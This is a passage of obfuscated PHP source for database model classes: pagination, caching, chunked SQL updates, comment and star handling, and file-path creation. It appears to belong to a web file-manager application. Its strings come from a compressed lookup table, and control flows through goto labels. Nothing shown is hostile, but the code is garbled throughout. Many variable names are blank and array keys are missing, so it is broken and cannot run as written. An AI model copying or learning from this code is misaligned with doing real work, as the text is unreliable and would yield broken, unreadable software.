$ʕ[12]; if ($پǂ == $) { return $this->cacheFunctionGet($, $ֹ, $랮); } if ($ && in_array($پǂ, $)) { $this->cacheFunctionClear($, $ֹ, $랮); } } } public function cacheFunctionGet($󦗐, $إ, $ɺ = '') { $ζ =& $_SERVER[]; $° = $this->cacheKeyMake($󦗐, $إ, $ɺ); $ݔ = Cache::get($°); if (!is_array($ݔ)) { if (method_exists($this, $ζ[341] . $󦗐)) { $󦗐 = $ζ[341] . $󦗐; } $ݔ = call_user_func_array(array($this, $󦗐), array($إ, !0)); Cache::set($°, $ݔ); } return $ݔ; } public function cacheFunctionClear($, $, $ڻ = '') { $ؼ = $; if (!is_array($)) { $ؼ = array($); } foreach ($ؼ as $쑥) { $彅 = $this->cacheKeyMake($, $쑥, $ڻ); Cache::remove($彅); } } public function cacheKeyMake($, $, $Ѝ) { $ =& $_SERVER[]; if ($Ѝ) { $ = $ . $[436] . $Ѝ; } return get_class($this) . $[11] . $ . $[437] . $; } protected function selectPageReset() { $㊥ =& $_SERVER[]; if (isset($GLOBALS[$㊥[438]])) { return; } $GLOBALS[$㊥[438]] = isset($GLOBALS[$㊥[7]][$㊥[439]]) ? $GLOBALS[$㊥[7]][$㊥[439]] : !1; $GLOBALS[$㊥[440]] = isset($GLOBALS[$㊥[7]][$㊥[428]]) ? $GLOBALS[$㊥[7]][$㊥[428]] : !1; $GLOBALS[$㊥[7]][$㊥[439]] = !1; $GLOBALS[$㊥[7]][$㊥[428]] = !1; } protected function selectPageRestore() { $ر =& $_SERVER[]; if (!isset($GLOBALS[$ر[438]])) { return; } $GLOBALS[$ر[7]][$ر[439]] = $GLOBALS[$ر[438]]; $GLOBALS[$ر[7]][$ر[428]] = $GLOBALS[$ر[440]]; if ($GLOBALS[$ر[7]][$ر[439]] === !1) { unset($GLOBALS[$ر[7]][$ر[439]]); } if ($GLOBALS[$ر[7]][$ر[428]] === !1) { unset($GLOBALS[$ر[7]][$ر[428]]); } unset($GLOBALS[$ر[438]]); unset($GLOBALS[$ر[440]]); } protected function selectPage($ãؿ = 200, $ = 1) { $ =& $_SERVER[]; global $in; $Ыǽ = $this->optionsValue(); $ = 100000; $ãؿ = isset($in[$[439]]) && $in[$[439]] ? $in[$[439]] : $ãؿ; if ($ãؿ === -1) { $in[$[439]] = !1; $ = 100000000; $ãؿ = $; } $Ŷ = $Ыǽ; $Ŷ[$[441]] = array(); $ãؿ = intval($ãؿ); $ãؿ = $ãؿ <= 5 ? 5 : ($ãؿ >= $ ? $ : $ãؿ); $ = intval(isset($in[$[428]]) && $in[$[428]] ? $in[$[428]] : $); $ = $ <= 1 ? 1 : $; $ = array(); $ = 1; $ރ = $this->selectPageCountBy(); if ($ == 1 && $) { $this->optionsValue($Ыǽ); $ = $this->page($, $ãؿ)->select(); $ػ⇍ = is_array($) ? count($) : 0; if ($ػ⇍ < $ãؿ) { $å = 1; } else { $this->optionsValue($Ŷ); $ػ⇍ = intval($this->count($ރ)); $å = ceil($ػ⇍ / $ãؿ); } } else { $this->optionsValue($Ŷ); $ػ⇍ = intval($this->count($ރ)); $å = ceil($ػ⇍ / $ãؿ); $ = $ >= $å ? $å : $; $this->optionsValue($Ыǽ); $ = $this->page($, $ãؿ)->select(); } $this->selectPageCountBy($[442]); if (!is_array($)) { $ = array(); } if ($å == 1) { $ػ⇍ = count($); } $ = array($[443] => array($[444] => $ػ⇍, $[439] => $ãؿ, $[428] => $, $[445] => $å), $[446] => $); return $; } protected function selectPageCountBy($ژ = false) { static $ވ = null; if (!$ژ) { return $ވ; } if ($ژ == $_SERVER[][442]) { $ވ = null; return; } $ވ = $ژ; } protected function checkLength($ݱ, $љ = 0, $޿ = '') { $Ü =& $_SERVER[]; $љ = $љ ? $љ : 65536; if (!$ݱ || strlen($ݱ) < $љ) { return; } $޿ = $޿ ? $޿ . $Ü[74] : $Ü[12]; show_json($޿ . LNG($Ü[447]) . "\50{$љ}\x29", !1); } protected function metaSet($ͭ, $Ӓ = null, $ψ = null) { $乻 =& $_SERVER[]; if (!$this->tableMeta || !$ͭ) { return !1; } $Ë = $this->tableMeta[$乻[448]]; $ˈˣ = $this->tableMeta[$乻[449]]; $ɷ = Model($ˈˣ); $ = array($Ë => $ͭ, $乻[450] => $Ӓ); if (is_null($Ӓ)) { return $ɷ->where(array($Ë => $ͭ))->delete(); } if (is_null($ψ) && is_string($Ӓ)) { return $ɷ->where($)->delete(); } $ɼ忱 = is_array($Ӓ) ? $Ӓ : array(); if (is_string($Ӓ)) { $ɼ忱[$Ӓ] = $ψ; } $І = array(); foreach ($ɼ忱 as $ۢӨ => $°џ) { if (is_null($°џ) && is_string($ۢӨ)) { $ɷ->where(array($Ë => $ͭ, $乻[450] => $ۢӨ))->delete(); continue; } $this->checkLength($°џ, !1, $ˈˣ . $乻[4] . $ۢӨ); $І[] = array($Ë => $ͭ, $乻[95] => $ۢӨ, $乻[451] => $°џ); } $̓ = $乻[452] . $ˈˣ; CacheLock::lock($̓); $ɷ->where(array($Ë => $ͭ))->addAll($І, array(), !0); CacheLock::unlock($̓); return !0; } public function metaGet($׋, $򎎀 = false) { $֙ =& $_SERVER[]; if (!$this->tableMeta) { return array(); } $Ɔ = $this->tableMeta[$֙[448]]; $ = Model($this->tableMeta[$֙[449]]); if ($򎎀) { $ = array($Ɔ => $׋, $֙[95] => $򎎀); return $->where($)->getField($֙[451]); } $ = array($Ɔ => $׋); $ٟ = $->field($֙[453])->where($)->select(); $ٟ = array_to_keyvalue($ٟ, $֙[95], $֙[451]); return $ٟ; } private function checkDataAutoHas($) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $蚵) { if (in_array($, explode($_SERVER[][50], $蚵[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$, $ۍ) { $ =& $_SERVER[]; if (!is_array($)) { return; } foreach ($this->dataAuto as $) { $ = $[0]; if (!in_array($ۍ, explode($[50], $[2]))) { continue; } switch (trim($[3])) { case $[396]: case $[397]: $Ӌ = $[1]; $Ň = isset($[4]) ? (array) $[4] : array(); if ($Ӌ == $[204] && array_key_exists($, $)) { if (!$[$]) { unset($[$]); } break; } if (isset($[$])) { array_unshift($Ň, $[$]); } if ($[396] == $[3]) { $[$] = call_user_func_array($Ӌ, $Ň); } else { $[$] = call_user_func_array(array(&$this, $Ӌ), $Ň); } break; case $[348]: if (isset($[$]) && $[$]) { $[$] = call_user_func_array(array(&$this, $[1]), array($[$])); } break; case $[351]: $[$] = $[$[1]]; break; case $[369]: if (isset($[$]) && !is_string($[$])) { $[$] = json_encode_force($[$]); $[$] = self::textEncode($[$]); } break; case $[398]: if ($[$] === $[12]) { unset($[$]); } break; case $[399]: $[$] = $[1]; default: break; } } if ($ۍ == $[430]) { $ݡ춞 = strtolower($this->db->getDbType()); if (strpos($ݡ춞, $[13]) !== 0) { return; } $ԛƸ = $this->field(!0)->fields; $ = $ԛƸ[$[329]]; if (isset($ԛƸ[$[328]])) { unset($[$ԛƸ[$[328]]]); } foreach ($ as $쑾 => $ۍ) { if (!isset($[$쑾])) { $[$쑾] = $[12]; } } } } private function dataAfterFilter(&$۵) { $܍ =& $_SERVER[]; foreach ($this->dataAuto as $𳤐) { $ݦ = $𳤐[0]; if (!isset($۵[$ݦ])) { continue; } if (!in_array($܍[432], explode($܍[50], $𳤐[2]))) { continue; } switch (trim($𳤐[3])) { case $܍[396]: case $܍[397]: $Ȳ = isset($𳤐[4]) ? (array) $𳤐[4] : array(); array_unshift($Ȳ, $۵[$ݦ]); if (isset($𳤐[4]) && $𳤐[4] == $܍[454]) { $Ȳ = array($۵[$ݦ]); } if ($܍[396] == $𳤐[3]) { $۵[$ݦ] = call_user_func_array($𳤐[1], $Ȳ); } else { $۵[$ݦ] = call_user_func_array(array(&$this, $𳤐[1]), $Ȳ); } break; case $܍[348]: if (isset($۵[$ݦ]) && $۵[$ݦ]) { $۵[$ݦ] = call_user_func_array(array(&$this, $𳤐[1]), array($۵[$ݦ])); } break; case $܍[351]: $۵[$ݦ] = $۵[$𳤐[1]]; break; case $܍[369]: $ = $۵[$ݦ]; $ = self::textDecode($); $۵[$ݦ] = json_decode($, !0); if (is_null($۵[$ݦ])) { $۵[$ݦ] = $; } break; case $܍[398]: if ($۵[$ݦ] === $܍[12]) { unset($۵[$ݦ]); } break; case $܍[399]: $۵[$ݦ] = $𳤐[1]; break; default: break; } } } public function saveAll($, $Ů = false) { $󈆙 =& $_SERVER[]; $П = $this->db; $ = $this->tablePrefix . $this->tableName; $솉 = $this->saveAllChunkMake($); $Ů = is_array($Ů) ? $Ů : array(); foreach ($솉 as $ٗ) { $ۛ = $󈆙[12]; $Æو = $󈆙[12]; $җ = array(); $ = array(); foreach ($ٗ as $ﴎ => $«) { $ۛ = $«[$󈆙[455]]; $[] = $«[$󈆙[456]]; $ = $П->parseValue($«[$󈆙[456]]); foreach ($«[$󈆙[457]] as $Ў => $ȵ́) { if (!$җ[$Ў]) { $җ[$Ў] = array(); } $җ[$Ў][] = $󈆙[458] . $ . $󈆙[459] . $П->parseValue($ȵ́); } } $Ѝ = $ۛ; $Ѝ = $П->parseKey($Ѝ); foreach ($җ as $Ў => $) { $Æو .= $󈆙[285] . $П->parseKey($Ў) . $󈆙[460] . $Ѝ . $󈆙[461]; $Æو .= implode($󈆙[285], $) . $󈆙[462]; } $ʊҬ = $Ů; $ʊҬ[$ۛ] = array($󈆙[7], $); $ = "\125\120\x44\101\x54\105\x20\140{$}\140\40\123\x45\124\40" . rtrim($Æو, $󈆙[50]) . $󈆙[285] . $П->parseWhere($ʊҬ); $this->execute($); $this->chunkEventCheck(count($ٗ)); } $this->chunkEventSet(); } public function saveAllEach($, $ = false) { $ =& $_SERVER[]; $ƹ = $this->db; $ư = $this->tablePrefix . $this->tableName; $֕ = $this->saveAllChunkMake($); $ = is_array($) ? $ : array(); foreach ($֕ as $) { foreach ($ as $ => $ًѻ) { $ = $[463]; foreach ($ًѻ[$[457]] as $˕楏 => $Ү׀) { $ .= $ƹ->parseKey($˕楏) . $[464] . $ƹ->parseValue($Ү׀) . $[50]; } $ǫ = $; $ǫ[$ًѻ[$[455]]] = $ًѻ[$[456]]; $Η = "\x55\x50\104\101\x54\105\40\140{$ư}\x60\x20\x53\105\x54\x20" . rtrim($, $[50]) . $[465] . $ƹ->parseWhere($ǫ) . $[466]; $this->execute($Η); } $this->chunkEventCheck(count($)); } $this->chunkEventSet(); } private function saveAllChunkMake($̍) { $ =& $_SERVER[]; $ɫ = self::SQL_WHERE_IN_CHUNK; $̍ = is_array($̍) ? $̍ : array(); $Ήץ = array(); $ͫ = ceil(count($̍) / $ɫ); for ($ = 0; $ < $ͫ; $++) { $ = array(); $ = array_slice($̍, $ * $ɫ, $ɫ); foreach ($ as $Ȯ) { if (!is_array($Ȯ) || count($Ȯ) < 4 || count($Ȯ) % 2 != 0) { continue; } $ = array(); for ($Ю = 2; $Ю < count($Ȯ); $Ю += 2) { $[$Ȯ[$Ю]] = $Ȯ[$Ю + 1]; } $[] = array($[455] => $Ȯ[0], $[456] => $Ȯ[1], $[457] => $); } $Ήץ[] = $; } return $Ήץ; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ߺ = false, $ = false) { $this->_chunkEvent = $ߺ; $this->_chunkEventParam = $; } private function chunkEventCheck($) { if (!$this->_chunkEvent) { return; } $ť = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ť[$_SERVER[][467]] = $; Hook::trigger($this->_chunkEvent, $ť); } public function addAll($ͤ, $ = array(), $ = false) { $։ =& $_SERVER[]; ignore_timeout(); $䔟 = self::SQL_WHERE_IN_CHUNK; if (empty($ͤ)) { $this->error = think_lang($։[349]); return !1; } $ = $this->_parseOptions($); foreach ($ͤ as $ => $) { $ͤ[$] = $this->_facade($); $this->_beforeInsert($ͤ[$], $); } if (method_exists($this->db, $։[350])) { for ($ = 0; $ < count($ͤ); $ += $䔟) { $ = array_slice($ͤ, $, $䔟); if (!is_array($) || count($) == 0) { break; } $Ǵό = $this->db->insertAll($, $, $); $this->chunkEventCheck(count($)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ͤ as $ => $) { $Ǵό = $this->db->insert($, $, $); } $this->commit(); } if (!1 !== $Ǵό) { $ʎ = $this->getLastInsID(); if ($ʎ) { return $ʎ; } } return $Ǵό; } public function save($ = '', $ = array()) { $ =& $_SERVER[]; $з܍ = self::SQL_WHERE_IN_CHUNK; $׵͛ = $this->optionsValue(); $Ǥ = $this->findWhereField($׵͛); if (!$Ǥ) { return parent::save($, $); } $ݣ = 0; $ = $׵͛[$[353]][$Ǥ][1]; $ = is_array($) ? $ : array(); $ = count($); for ($ = 0; $ < $; $ += $з܍) { $ԩ = array_slice($, $, $з܍); if (!is_array($ԩ) || count($ԩ) == 0) { break; } $׵͛[$[353]][$Ǥ][1] = $ԩ; $this->optionsValue($׵͛); $ݣ += parent::save($, $); $this->chunkEventCheck(count($ԩ)); } $this->chunkEventSet(); return $ݣ; } public function add($Վ = '', $ֹ = array(), $ = false) { if ($this->addTaskStatus && is_array($Վ)) { $this->addTaskData[] = $Վ; return; } return parent::add($Վ, $ֹ, $); } public function parseWhereLike($¼, $ = '', $ = false, &$ = false) { $ =& $_SERVER[]; $ = $GLOBALS[$[6]][$[468]]; if (!$[$[469]]) { return $¼; } if (!in_array($this->tableName, array($[429], $[470], $[471], $[472]))) { return $¼; } if (!is_array($¼)) { return $¼; } $ῑ = array(); $ה = 0; foreach ($¼ as $ë => $۵) { if (is_array($۵) && count($۵) == 2 && $۵[0] == $[473] && is_string($۵[1]) && substr($۵[1], 0, 1) == $[474] && substr($۵[1], strlen($۵[1]) - 1, 1) == $[474]) { $ = !0; $ = is_string($ë) ? $ë : $; $զ = substr($۵[1], 1, strlen($۵[1]) - 2); $զ = $this->db->escapeString($զ); if (!strpos($, $[10])) { $ = $[475] . $ . $[475]; } $˾ = $[220] . $զ . $[220]; $զ = str_replace(array($[10], $[476]), $[477], $զ); if ($[$[478]]) { $˾ = $[479] . $զ . $[480]; if ($[$[481]]) { $˾ = $[480] . $զ . $[479]; } } $Շ = Hook::trigger($[482], $զ, $˾); if ($Շ) { $˾ = $Շ; } $ῑ[$ה] = $[483] . $ . $[484] . $˾ . $[485]; $ה++; continue; } if (is_array($۵)) { $ = is_string($ë) ? $ë : $; $۵ = $this->parseWhereLike($۵, $, !0, $); } if (is_numeric($ë)) { $ῑ[$ה] = $۵; $ה++; } else { $ῑ[$ë] = $۵; } } if ($ && !$) { } return $ῑ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ = array()) { $ =& $_SERVER[]; $Ќ = self::SQL_WHERE_IN_CHUNK; $렱׌ = $this->optionsValue(); $Ɓ = $this->findWhereField($렱׌); if (!$Ɓ || isset($렱׌[$[368]]) || isset($렱׌[$[428]])) { return parent::select($); } $ = $렱׌[$[353]][$Ɓ][1]; $ = is_array($) ? $ : array(); $ڧ = null; for ($Ⱦ = 0; $Ⱦ < count($); $Ⱦ += $Ќ) { $ = array_slice($, $Ⱦ, $Ќ); if (!is_array($) || count($) == 0) { break; } $렱׌[$[353]][$Ɓ][1] = $; $this->optionsValue($렱׌); $󦼅 = parent::select($); if (!$󦼅) { continue; } $ڧ = is_array($ڧ) ? $ڧ : array(); $ڧ = array_merge($ڧ, $󦼅); } return $ڧ; } public function delete($ٟ = array()) { $ɻ״ =& $_SERVER[]; $٧ = self::SQL_WHERE_IN_CHUNK; $Ö = $this->optionsValue(); $ɾꙙ = $this->findWhereField($Ö); if (!$ɾꙙ) { return parent::delete($ٟ); } $פđ = 0; $ = $Ö[$ɻ״[353]][$ɾꙙ][1]; $ = is_array($) ? $ : array(); for ($㷱ӱ = 0; $㷱ӱ < count($); $㷱ӱ += $٧) { $ = array_slice($, $㷱ӱ, $٧); if (!is_array($) || count($) == 0) { break; } $Ö[$ɻ״[353]][$ɾꙙ][1] = $; $this->optionsValue($Ö); $פđ += parent::delete($ٟ); } return $פđ; } private function findWhereField($ꐓ) { $ =& $_SERVER[]; $ӻ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ꐓ) || !is_array($ꐓ[$[353]])) { return !1; } foreach ($ꐓ[$[353]] as $ŉ => $˰ѻ) { if (is_array($˰ѻ) && isset($˰ѻ[0]) && is_string($˰ѻ[0]) && strtolower($˰ѻ[0]) == $[7] && is_array($˰ѻ[1]) && count($˰ѻ[1]) > $ӻ) { ignore_timeout(); return $ŉ; } } return !1; } public function setMasterDB($㔆 = true) { think_config($_SERVER[][486], $㔆); } } goto Bѻˈ; d: define($_SERVER[][0], $_SERVER[][1]); $_SERVER[] = explode($_SERVER[][2], gzinflate(substr($_SERVER[][3], 10, -8))); function binCheckEq($軅, $) { return $軅 == $; } goto eӨҽ; c: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\156\164"; protected $tableMeta = array("\164\141\x62\154\145\x4e\141\155\145" => "\143\157\x6d\155\x65\x6e\x74\x5f\155\145\x74\141", "\x6d\x65\x74\x61\106\151\x65\154\144" => "\x63\x6f\155\x6d\x65\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($˟ݩ) { $Ϗ =& $_SERVER[]; if ($˟ݩ[$Ϗ[2205]]) { $Ь߂ = $this->where(array($Ϗ[2206] => $˟ݩ[$Ϗ[2205]]))->find(); if (!$Ь߂ || $Ь߂[$Ϗ[188]] != $˟ݩ[$Ϗ[188]] || $Ь߂[$Ϗ[589]] != $˟ݩ[$Ϗ[589]]) { return !1; } $this->where(array($Ϗ[2206] => $˟ݩ[$Ϗ[2205]]))->setAdd($Ϗ[2207], 1); } $˟ݩ[$Ϗ[2208]] = 0; $˟ݩ[$Ϗ[2207]] = 0; $˟ݩ[$Ϗ[844]] = 1; return $this->add($˟ݩ); } public function commentCount($ⷬѓ, $, $ = false) { $ﲶ플 =& $_SERVER[]; if (!$ⷬѓ) { return array(); } if (is_string($ⷬѓ) || is_int($ⷬѓ)) { $ⷬѓ = array($ⷬѓ); } $έ = array($ﲶ플[589], $ﲶ플[2209] => $ﲶ플[585]); $ = array($ﲶ플[589] => array($ﲶ플[7], $ⷬѓ), $ﲶ플[188] => $); if ($) { $[$ﲶ플[1586]] = $; } $抌 = $this->field($έ)->where($)->group($ﲶ플[589])->select(); return array_to_keyvalue($抌, $ﲶ플[589], $ﲶ플[585]); } public function starTarget($ã, $⡽) { $㸷 =& $_SERVER[]; $ = $ã + self::TYPE_STAR_OFFSET; $ȋ܄ = array($㸷[1586] => USER_ID, $㸷[188] => $, $㸷[589] => $⡽); $Ύ = $this->where($ȋ܄)->find(); if ($Ύ) { return $this->where(array($㸷[487] => $Ύ[$㸷[487]]))->delete(); } $Ө = array($㸷[2205] => 0, $㸷[1586] => USER_ID, $㸷[844] => 1, $㸷[168] => $㸷[12], $㸷[188] => $, $㸷[589] => $⡽, $㸷[2208] => 0, $㸷[2207] => 0); return $this->add($Ө); } public function starTargetCount($͎, $쫃) { $ =& $_SERVER[]; $维 = $쫃 + self::TYPE_STAR_OFFSET; $ = $this->commentCount($͎, $维); $ = $this->commentCount($͎, $维, USER_ID); return array($[2210] => $, $[2211] => $); } public function starTargetUserList($, $ג) { $꓊ =& $_SERVER[]; $ = $ + self::TYPE_STAR_OFFSET; $ = array($꓊[589] => $ג, $꓊[188] => $); $ӧ޾ = $this->where($)->count(); $ڴ܄ = array($꓊[332] => $ӧ޾, $꓊[2212] => array()); if (!$ӧ޾) { return $ڴ܄; } $ = $this->field($꓊[1586])->where($)->limit(500)->select(); $ = array_to_keyvalue($, $꓊[12], $꓊[1586]); $ڴ܄[$꓊[2212]] = Model($꓊[597])->userListInfo($); return $ڴ܄; } public function prasiseUserList($ŭ٭) { $֕ =& $_SERVER[]; $ = array($֕[2213] => $ŭ٭); $ = $this->where($)->find(); $Š = _get($, $֕[2208], 0); $ۚ = array($֕[332] => $Š, $֕[2212] => array()); if (!$Š) { return $ۚ; } $ = Model($֕[2214])->field($֕[1586])->where($)->limit(500)->select(); $ = array_to_keyvalue($, $֕[12], $֕[1586]); $ۚ[$֕[2212]] = Model($֕[597])->userListInfo($); return $ۚ; } public function remove($⣑) { $ӷ =& $_SERVER[]; $ׯ = array($ӷ[2206] => $⣑); $ʁѯ = $this->where($ׯ)->find(); if ($ʁѯ[$ӷ[2205]]) { $this->where(array($ӷ[2206] => $ʁѯ[$ӷ[2205]]))->setAdd($ӷ[2207], -1); } return $this->removeArray($⣑); } public function edit($ٙ, $Ξ) { $ =& $_SERVER[]; $ȭ = array($[2206] => $ٙ); return $this->where($ȭ)->save(array($[2215] => $Ξ)); } public function prasise($) { $۠ŋ =& $_SERVER[]; $ = Model($۠ŋ[2216]); $ʭʭ = array($۠ŋ[2206] => $, $۠ŋ[1961] => USER_ID); $ = $->where($ʭʭ)->find(); if (!$) { $->add($ʭʭ); $ʶ = $this->where(array($۠ŋ[2206] => $))->setAdd($۠ŋ[2208], 1); } else { $->where($ʭʭ)->delete(); $ʶ = $this->where(array($۠ŋ[2206] => $))->setAdd($۠ŋ[2208], -1); } return $ʶ; } public function targetInfo($ߢ, $٣) { $ɞ =& $_SERVER[]; $첌 = array($ɞ[670] => $ߢ, $ɞ[671] => $٣); $ = $this->where($첌)->count(); $׊ҽ = "\122\x49\x47\x48\124\40\x4a\117\111\116\40{$this->tablePrefix}\x63\157\155\155\145\156\164\x5f\x70\162\141\x69\163\145\x20\x73\x74\x61\162\40\x6f\156\40\143\157\155\x6d\x65\x6e\164\56\143\x6f\155\155\145\156\164\111\x44\x20\75\x20\x73\x74\x61\162\x2e\x63\157\155\155\x65\x6e\x74\111\x44"; $ǝ = $this->alias($ɞ[429])->where($첌)->join($׊ҽ, $ɞ[2217])->count(); $ƫ = array($ɞ[2218] => $, $ɞ[2219] => $ǝ); return $ƫ; } public function listData($) { $֑ =& $_SERVER[]; if (isset($[$֑[2220]])) { if ($[$֑[2220]]) { $[$֑[2213]] = array($֑[1176], intval($[$֑[2220]])); } unset($[$֑[2220]]); } if (isset($[$֑[2221]])) { if ($[$֑[2221]]) { $[$֑[2213]] = array($֑[1173], intval($[$֑[2221]])); } unset($[$֑[2221]]); } return $this->_listData($); } private function _listData($ூ) { $윳 =& $_SERVER[]; $ޑѳ = $this->where($ூ)->_makeOrder()->selectPage(100); $this->_listAppendParent($ޑѳ[$윳[446]]); $this->_listAppendUser($ޑѳ[$윳[446]]); $this->_listAppendMeta($ޑѳ[$윳[446]]); return $ޑѳ; } private function _makeOrder() { $ =& $_SERVER[]; $ė = array($[2208], $[2207], $[231]); $ = Input::get($[544], $[7], $[512], $ė); $۹¶ = Input::get($[545], $[7], $[1963], array($[2222], $[540])); $ժ = $ . $[53] . $۹¶; return $this->order($ժ); } private function _listAppendParent(&$) { $н =& $_SERVER[]; $в = array_unique(array_to_keyvalue($, $н[12], $н[2205])); $в = array_remove_value($в, $н[228]); if (!$в) { return; } $ԡ = $this->where(array($н[2206] => array($н[7], $в)))->select(); $ԡ = array_to_keyvalue($ԡ, $н[2213]); foreach ($ as &$) { if (isset($ԡ[$[$н[2205]]])) { $[$н[2223]] = $ԡ[$[$н[2205]]]; } } unset($); } private function _listAppendUser(&$޻) { $ٹč =& $_SERVER[]; $ = array_unique(array_to_keyvalue($޻, $ٹč[12], $ٹč[1586])); $ = array_remove_value($, $ٹč[228]); if (count($) == 0) { return; } foreach ($޻ as $) { if (isset($[$ٹč[2223]])) { $[] = $[$ٹč[2223]][$ٹč[1586]]; } } $Ǯح = Model($ٹč[617])->userListInfo($); foreach ($޻ as &$) { $[$ٹč[684]] = $Ǯح[$[$ٹč[1586]]]; if (isset($[$ٹč[2223]])) { $[$ٹč[2223]][$ٹč[684]] = $Ǯح[$[$ٹč[2223]][$ٹč[1586]]]; } } unset($); } private function _listAppendMeta(&$₴) { $Л =& $_SERVER[]; $ = array_unique(array_to_keyvalue($₴, $Л[12], $Л[2213])); $ = array_remove_value($, $Л[228]); if (!$) { return; } foreach ($₴ as $) { if (isset($[$Л[2223]])) { $[] = $[$Л[2223]][$Л[2213]]; } } $Ͻ = $this->metaList($); if (!$Ͻ) { return !1; } foreach ($₴ as &$) { $[$Л[555]] = $Ͻ[$[$Л[2213]]]; if (isset($[$Л[2223]])) { $[$Л[2223]][$Л[555]] = $Ͻ[$[$Л[2223]][$Л[2213]]]; } } unset($); } private function metaList($鸳Ҿ) { $ˍ =& $_SERVER[]; if (!$鸳Ҿ) { return array(); } $ = array($ˍ[2213] => array($ˍ[7], $鸳Ҿ)); $˹ = Model($ˍ[2224])->where($)->select(); $˹ = array_to_keyvalue_group($˹, $ˍ[2213]); foreach ($˹ as $Ǡ => $) { $Ɔ = array(); foreach ($ as $֝) { $Ɔ[$֝[$ˍ[95]]] = $֝[$ˍ[451]]; } $˹[$Ǡ] = $Ɔ; } return $˹ ? $˹ : array(); } public function removeTarget($, $σ) { $ =& $_SERVER[]; if (!$σ) { return !0; } $σ = is_array($σ) ? $σ : array($σ); $ = array($[188] => $, $[589] => array($[7], $σ)); $ҿ׺ = $this->field($[2213])->where($)->select(); $۟ = array_to_keyvalue($ҿ׺, $[12], $[2213]); return $this->removeArray($۟); } public function removeArray($޺) { $ =& $_SERVER[]; if (!$޺) { return !0; } $޺ = is_array($޺) ? $޺ : array($޺); $ = array($[2213] => array($[7], $޺)); Model($[2216])->where($)->delete(); Model($[2225])->where($)->delete(); return $this->where($)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\x69\x6c\x65\137\x63\x6f\x6e\164\x65\x6e\x74\163"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\145\x54\151\155\145", "\x74\151\155\145", "\151\156\163\145\162\164", "\146\165\x6e\143\164\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\154\145"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\141\x6d\x65" => "\x69\157\137\x66\151\x6c\x65\137\x6d\x65\164\x61", "\155\145\164\x61\x46\151\x65\154\x64" => "\146\x69\154\145\111\104"); public function fileInfo($) { $魗 =& $_SERVER[]; static $ = array(); if (!isset($[$])) { $㻹 = $魗[2226]; $ｯ = Model($魗[560])->field($㻹)->where(array($魗[558] => $))->find(); $[$] = $ｯ; } return $[$]; } public function addFileByContent($ƸԪ = '', $ȹ, $⍬ = '') { $˥ =& $_SERVER[]; $ = TEMP_PATH . $˥[2227]; if (!is_dir($)) { mk_dir($); } $ = $ . $˥[2228] . rand_string(16); $偂 = file_put_contents($, $ƸԪ); if ($偂 === !1 || strlen($ƸԪ) != $偂) { return !1; } $ = $this->addFile($, $ȹ, $⍬, !0); if (file_exists($)) { @unlink($); } return $; } public function createFileName($, $, $ڤ = false, $靅 = false) { $ =& $_SERVER[]; $ = IO::init($[8]); $ = $this->_makeFilePath($, $, $, $ڤ, $靅); $޼ϖ = $->pathFather($); static $䋇ч = false; $̀ = $[2229] . md5($޼ϖ); if (!$䋇ч && !Cache::get($̀)) { $䋇ч = !0; $胀ͭ = IO::mkdir($޼ϖ); if (!IO::exist($胀ͭ . $[893])) { IO::mkfile($胀ͭ . $[893]); } Cache::set($̀, 1, 3600 * 2); } return $; } public function _makeFilePath($, $, $Ѐ, $õ = false, $¨ = false) { $Ξ =& $_SERVER[]; $Ȼ¹ = Model($Ξ[867])->get($Ξ[2230]); $֙ = $Ξ[1421] . $[$Ξ[487]] . $Ξ[499] . date($Ξ[2231]); $ꨳ = $֙ . rand_string(5) . short_id(100); $ = str_replace($Ξ[8], $Ξ[11], KodIO::clear($)); $辖 = $Ѐ->ext($); if (!$) { $Ȼ¹ = $Ξ[938]; } switch ($Ȼ¹) { case $Ξ[2232]: if ($辖) { $ꨳ = $ꨳ . $Ξ[10] . $辖; } if ($辖 == $Ξ[2167]) { $ꨳ .= $Ξ[1390]; } break; case $Ξ[2233]: $ = Model($Ξ[867])->get($Ξ[868]); $̅ = substr(md5($Ξ[869] . $ . date($Ξ[843])), 0, 8); $֙ = $Ξ[1421] . $[$Ξ[487]] . $Ξ[499] . date($Ξ[2234]) . $̅ . $Ξ[8]; if ($辖 == $Ξ[2167]) { $ .= $Ξ[1390]; } $ق = $Ξ[2235] . $֙ . $; CacheLock::lock($ق); $ꨳ = $֙ . $; if (IO::exist($֙ . $)) { $ί = substr($, 0, strlen($) - strlen($辖)); $ = $¨ ? substr($¨, 0, 5) : ($õ ? substr($õ, 0, 5) : rand_string(5)); $ .= rand_string(3); $ꨳ = $֙ . $ί . $; if ($辖) { $ꨳ = $ꨳ . $Ξ[10] . $辖; } } if (IO::isOsDriver($ꨳ) && !IO::isUploadServer($ꨳ)) { if (IO::exist($ꨳ)) { CacheLock::unlock($ق); return $ꨳ; } $ = IO::setContent($ꨳ, $Ξ[12]); if (!$) { show_json($Ξ[2236], !1); } } CacheLock::unlock($ق); break; case $Ξ[938]: break; default: break; } return $ꨳ; } public function addFileByRemote($, $, $Ċ = array()) { $ =& $_SERVER[]; if (!IO::isFile($)) { return !1; } $ = $Ċ[$[563]] ? $Ċ[$[563]] : $[12]; $ǀ = IO::hashMd5($, $); $ = KodIO::parse($); $ = array($[640] => IO::size($), $[2237] => 1, $[509] => $, 